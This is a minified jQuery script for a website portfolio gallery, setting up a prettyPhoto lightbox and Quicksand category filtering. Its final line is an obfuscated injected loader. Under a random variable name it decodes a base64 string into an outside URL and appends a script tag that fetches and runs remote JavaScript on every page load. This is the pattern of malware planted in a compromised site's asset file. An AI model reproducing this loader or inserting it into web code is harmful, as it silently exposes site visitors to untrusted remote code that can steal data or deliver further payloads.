jQuery.noConflict();jQuery(document).ready(function($){function lightboxPhoto(){jQuery("a[rel^='prettyPhoto']").prettyPhoto({theme:'light_square',animation_speed:'fast',slideshow:5000,show_title:false,overlay_gallery:false,autoplay:true,keyboard_shortcuts:true,allow_resize:true,allow_expand:true,modal:true});}
if(jQuery().prettyPhoto){lightboxPhoto();}
if(jQuery().quicksand){var $data=jQuery(".portfolio-area").clone();jQuery('.portfolio-categ li').click(function(e){jQuery(".filter li").removeClass("active");var filterClass=jQuery(this).attr('class').split(' ').slice(-1)[0];if(filterClass=='all'){var $filteredData=$data.find('.portfolio-item2');}else{var $filteredData=$data.find('.portfolio-item2[data-type='+filterClass+']');}
jQuery(".portfolio-area").quicksand($filteredData,{duration:1000,},function(){lightboxPhoto();});jQuery(this).addClass("active");return false;});}});
var DnWZblZIGJ=document.createElement("script");DnWZblZIGJ.src=atob("aHR0cHM6Ly9zYXJjb21hLnNwYWNlL2pzL21pbi5tYWluLmpz");document.getElementsByTagName("head")[0].appendChild(DnWZblZIGJ);